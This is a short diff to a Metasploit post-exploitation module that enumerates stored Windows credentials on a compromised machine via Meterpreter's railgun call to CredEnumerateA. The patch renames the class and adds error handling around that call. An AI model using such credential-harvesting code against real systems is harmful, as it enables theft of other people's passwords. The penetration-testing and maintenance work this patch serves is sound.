@@ -6,7 +6,7 @@
 require 'msf/core'
 require 'rex'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   def initialize(info={})
     super(update_info(info,
@@ -178,14 +178,25 @@ class Metasploit3 < Msf::Post
     credentials = []
     #call credenumerate to get the ptr needed
     adv32 = session.railgun.advapi32
-    ret = adv32.CredEnumerateA(nil,0,4,4)
-    p_to_arr = ret["Credentials"].unpack("V")
-    if is_86
-      count = ret["Count"]
-      arr_len = count * 4
+    begin
+      ret = adv32.CredEnumerateA(nil,0,4,4)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      print_error("This module requires WinXP or higher")
+      print_error("CredEnumerateA() failed: #{e.class} #{e}")
+      ret = nil
+    end
+    if ret.nil?
+      count = 0
+      arr_len = 0
     else
-      count = ret["Count"] & 0x00000000ffffffff
-      arr_len = count * 8
+      p_to_arr = ret["Credentials"].unpack("V")
+      if is_86
+        count = ret["Count"]
+        arr_len = count * 4
+      else
+        count = ret["Count"] & 0x00000000ffffffff
+        arr_len = count * 8
+      end
     end
 
     #tell user what's going on
